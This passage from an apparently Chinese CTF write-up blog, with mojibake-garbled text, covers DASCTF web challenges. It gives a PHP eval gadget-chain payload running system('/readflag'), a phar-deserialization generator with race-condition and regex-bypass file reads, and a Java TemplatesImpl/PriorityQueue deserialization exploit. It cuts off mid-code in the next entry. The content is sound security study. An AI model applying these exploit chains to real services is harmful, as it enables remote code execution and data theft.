<p>é€šè¿‡ä¼ å‚å®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œå¦‚æœè¿™ä¸ªç±»å½“å‰ä¸å­˜åœ¨åˆ™é€šè¿‡<code>spl_autoload_register</code>åŒ…å«ç±»æ–‡ä»¶ï¼Œé€šè¿‡<code>properties</code>ç»™ç±»é‡Œé¢çš„æŸäº›å±æ€§èµ‹å€¼ï¼Œæœ€åæ‰§è¡Œrunæ–¹æ³•</p>
<p>ä¹‹åç›´æ¥å»å®¡è®¡classç›®å½•ä¸‹çš„å››ä¸ªç±»ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°éƒ½æ²¡æœ‰æ„é€ æ–¹æ³•ï¼ˆ<code>__construct</code>ï¼‰ï¼Œæ‰€ä»¥åªèƒ½ä»<code>run</code>å…¥æ‰‹ï¼Œç„¶ååœ¨<code>Base</code>ç±»ä¸­å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬ç‰¹åˆ«æƒ³è°ƒç”¨çš„æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            extract(<span class="variable">$_data_</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç°åœ¨å°±è¦æ‰¾æœ€ç»ˆå¯ä»¥è°ƒç”¨åˆ°<code>evaluateExpression</code>æ–¹æ³•çš„é“¾å­äº†</p>
<p>å…ˆå»çœ‹<code>ListView-&gt;run</code>ï¼Œè°ƒç”¨åˆ°äº†<code>renderContent</code>ï¼Œå¹¶é€šè¿‡<code>renderSection</code>æ–¹æ³•å¯¹<code>$this-&gt;template</code>æ­£åˆ™åŒ¹é…æ“ä½œï¼Œè€Œ<code>renderSection</code>åˆ¤æ–­æ­£åˆ™åŒ¹é…åˆ°çš„<code>renderxxx</code>æ˜¯å¦å­˜åœ¨æ–¹æ³•ï¼Œå­˜åœ¨åˆ™ç›´æ¥è°ƒç”¨è¯¥æ–¹æ³•ï¼Œä¹‹åå°±è¦å»æ‰¾å¯åˆ©ç”¨çš„æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">            <span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">            ob_clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨<code>TeseView</code>ä¸­å‘ç°å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•ï¼Œå¹¶ä¸”è¿™ä¸ªç±»è¿˜ç»§æ‰¿äº†<code>ListView</code>ç±»</p>
<p>è¿™é‡Œåˆè¦å›åˆ°å‰é¢ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨åˆ°<code>evaluateExpression</code>ï¼Œæ‰€ä»¥å°±ç›´æ¥å»æ‰¾å¯ä»¥è°ƒç”¨åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°<code>renderTableRow</code>ï¼Œåªè¦<code>$this-&gt;rowHtmlOptionsExpression</code>ä¸ºæˆ‘ä»¬çš„å‘½ä»¤å°±å¯ä»¥ç›´æ¥æ‰§è¡Œäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>) // è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬ä¸€ä¸ª<span class="title">if</span>è¯­å¥è°ƒç”¨ï¼Œå› ä¸ºæ¯”è¾ƒå¥½åˆ©ç”¨</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">            <span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">                <span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       â€¦â€¦</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        <span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    â€¦â€¦</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pocï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ListView#run-&gt;ListView#renderContent-&gt;LiseView#renderSection-&gt;renderTableBody-&gt;TestView#renderTableRow-&gt;Base#evaluateExpression</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">action=TestView</span><br><span class="line">post:</span><br><span class="line">properties[rowHtmlOptionsExpression]=system(&#x27;/readflag&#x27;)</span><br><span class="line">&amp;properties[template]=&#123;TableBody&#125;</span><br><span class="line">&amp;properties[data]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cc58a52e404541618bed1d1ecaebf139.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<blockquote>
<p>åˆåˆåˆåˆæ¥å¤ç°äº†</p>
</blockquote>
<h3 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h3><ul>
<li>æ¡ä»¶ç«äº‰</li>
</ul>
<p>æœ‰å…ƒç´ è¢«éšè—äº†ï¼Œç›´æ¥å»<code>edit.php</code></p>
<p><img src="https://img-blog.csdnimg.cn/82f48fbefc5148a08ac743e27a61a62b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>png</code>å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">png=../edit.php&amp;flag=</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥çœ‹<code>uploads/head.png</code>å°±å¯ä»¥å¾—åˆ°æºç ï¼ˆä¸è¿‡è¿™ä¸ªæ˜¯çœ‹åˆ«çš„å¸ˆå‚…çš„wpå®¡è®¡æºç å‘ç°çš„ï¼Œä½†ä¸çŸ¥é“åˆ«çš„å¸ˆå‚…æ˜¯ä¸æ˜¯è¿™æ ·å‘ç°çš„ï¼š</p>
<p><code>edit.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//Ã¤Â»Â¥rootÃ¦ÂÂƒÃ©Â™ÂÃ¥Â¤ÂÃ¥ÂˆÂ¶/flag Ã¥ÂˆÂ° /tmp/flag.txtÃ¯Â¼ÂŒÃ¥Â¹Â¶chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//Ã¤Â¸ÂÃ§Â»Â™Ã¦ÂˆÂ‘Ã§ÂœÂ‹Ã¦ÂˆÂ‘Ã¨Â‡ÂªÃ¥Â·Â±Ã¥Â†Â™Ã¤Â¸ÂªflagÃ£Â€Â‚</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Ã¦ÂˆÂÃ¥ÂŠÂŸÃ¦Â›Â´Ã¦ÂÂ¢Ã¥Â¤Â´Ã¥ÂƒÂ&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Ã©ÂÂÃ¦Â­Â£Ã¥Â¸Â¸Ã¦Â–Â‡Ã¤Â»Â¶Ã¯Â¼ÂŒÃ¥Â·Â²Ã¨Â¢Â«Ã¥ÂˆÂ Ã©Â™Â¤&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>upload.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ã¨Â¯Â·Ã¤Â¸ÂŠÃ¤Â¼Â Ã¥Â¤Â´Ã¥ÂƒÂ&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = md5(<span class="string">&quot;png&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Ã¤Â¸ÂŠÃ¤Â¼Â Ã¦ÂˆÂÃ¥ÂŠÂŸÃ¯Â¼Âš &quot;</span>.<span class="variable">$path</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹è¿˜æ˜¯è¦çœ‹<code>edit.php</code></p>
<h4 id="éé¢„æœŸï¼š"><a href="#éé¢„æœŸï¼š" class="headerlink" title="éé¢„æœŸï¼š"></a>éé¢„æœŸï¼š</h4><p>ç®€å•å®¡è®¡ä¸€ä¸‹ï¼š</p>
<p>1.ç¬¬ä¸€ä¸ªifè¯­å¥banæ‰äº†phpåè®®å’Œpharåè®®</p>
<p>2.ç¬¬äºŒä¸ªifè¯­å¥é€šè¿‡symlinkå°†æˆ‘ä»¬ä¼ å…¥çš„pngä¸<code>uplaod/head.png</code>é“¾æ¥ï¼Œå¯¼è‡´å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>3.flagç±»çš„copyflagæ–¹æ³•å°†æ ¹ç›®å½•ä¸‹çš„flagä¼ åˆ°<code>/tmp/flag.txt</code>ï¼Œå¹¶ä¸”ä½¿å¾—<code>www-data</code>æ‰€æœ‰</p>
<p>å› ä¸ºå­˜åœ¨ç±»ï¼Œè€Œæˆ‘ä»¬åˆæƒ³è°ƒç”¨è¿™ä¸ªç±»çš„copyflagæ–¹æ³•ï¼Œè€Œè¿™ä¸ªç±»åœ¨<code>__destruct</code>ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œè¿™é‡Œåˆæ²¡æœ‰æ˜æ˜¾çš„ååºåˆ—åŒ–è§¦å‘ç‚¹ï¼Œä½†åˆå¾ˆå¤šæ–‡ä»¶æ“ä½œçš„å‡½æ•°ï¼Œé‚£å°±ç›´æ¥ç”¨<code>phar</code>åè®®å§</p>
<p>ç”±äºç¬¬ä¸€ä¸ªifç›´æ¥ä¼šæ­£åˆ™åŒ¹é…åˆ°<code>phar</code>ï¼Œé‚£å°±åªèƒ½çœ‹åé¢äº†ï¼Œæœ¬åœ°æµ‹è¯•ä¹‹åå‘ç°å¯ä»¥åˆ©ç”¨<code>unlink</code>ï¼Œæ‰€ä»¥ç°åœ¨è¦ä½¿å¾—<code>symlink($filename, $head)</code>ä¸ºflaseå°±å¥½äº†</p>
<p>pharï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//Ã¤Â»Â¥rootÃ¦ÂÂƒÃ©Â™ÂÃ¥Â¤ÂÃ¥ÂˆÂ¶/flag Ã¥ÂˆÂ° /tmp/flag.txtÃ¯Â¼ÂŒÃ¥Â¹Â¶chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;symlink.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// phar://uploads/b143915ffb6ca6b19dff97b6a93389f0.png</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¹‹åï¼Œè®°å½•ä¸‹æ–‡ä»¶çš„è·¯å¾„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://uploads/b143915ffb6ca6b19dff97b6a93389f0.png</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨bpçš„intruder æ¡ä»¶ç«äº‰æ‰§è¡Œpharåè®®ï¼Œç”¨<code>../edit.php</code>æµ‹è¯•çš„æ—¶å€™è™½ç„¶æˆåŠŸäº†ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°<code>/uploads/head.png</code>é‡Œé¢çš„å†…å®¹ä¹Ÿå˜æˆäº†<code>edit.php</code>çš„å†…å®¹ï¼Œä½†æ˜¯ç”±äºæƒ³è¦å¾—åˆ°<code>/tmp/flag.txt</code>å†…å®¹çš„æ—¶å€™å› ä¸ºæ­£åˆ™æ²¡æœ‰åŒ¹é…åˆ°ï¼Œç›´æ¥åˆ¤æ–­æ–‡ä»¶é‡Œé¢å­˜åœ¨flagï¼Œä½¿å¾—flagè¢«è¦†ç›–äº†</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ <code>..//../../../../../tmp/flag.txt</code>ï¼Œ<code>//</code>ç”¨äºç»•è¿‡æ­£åˆ™åŒ¹é…</p>
<p><img src="https://img-blog.csdnimg.cn/53cf933879274312ab5c8e20b90d92c0.png" alt="img"></p>
<blockquote>
<p>å¬è¯´è¿™ä¸æ˜¯é¢„æœŸè§£ï¼Œç­‰ä¹‹åå­¦ä¹ ä¸€ä¸‹</p>
</blockquote>
<h3 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h3><blockquote>
<p>å¤ç°æ¥å•¦â€¦â€¦</p>
</blockquote>
<p>å­¦javaæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œç°åœ¨æ¥çœ‹çœ‹æ¬¸å˜¿â€¦â€¦</p>
<p>ä¸‹è½½jaråŒ…ï¼Œå¯ä»¥å…ˆçœ‹pom.xmlï¼Œå‘ç°æ²¡æœ‰å…¶ä»–å¦å¤–çš„ä¾èµ–ï¼Œå†å»çœ‹çœ‹ç±»</p>
<p>emmmmmï¼Œå’Œåˆšåšè¿‡çš„<a href="https://ameuu.github.io/2022/07/22/JavaDeserializeLabs/">lab9</a>ï¼Œä¸€æ¨¡ä¸€æ ·ï¼Œç›´æ¥ç”¨é‚£ä¸ªexp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab9;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.warmup.MyInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        MyInvocationHandler handler = <span class="keyword">new</span> MyInvocationHandler();</span><br><span class="line">        setField(handler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Comparator proxy = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;templates, <span class="number">1</span>&#125;);</span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;comparator&quot;</span>, proxy);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://erroratao.github.io/writeup/DASCTF2022_4th/">atao</a></p>
<p><a href="http://www.snowywar.top/?p=3077">é›ªæ®‡å§å§</a></p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF x SU æœˆèµ›</title>
    <url>/2022/03/30/DASCTF-x-SU-%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%E4%B8%AD/</url>
    <content><![CDATA[<blockquote>
<p>ezpopã€calcã€upgdstore</p>
</blockquote>
<span id="more"></span>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h4><p>ç›´æ¥å¾—åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 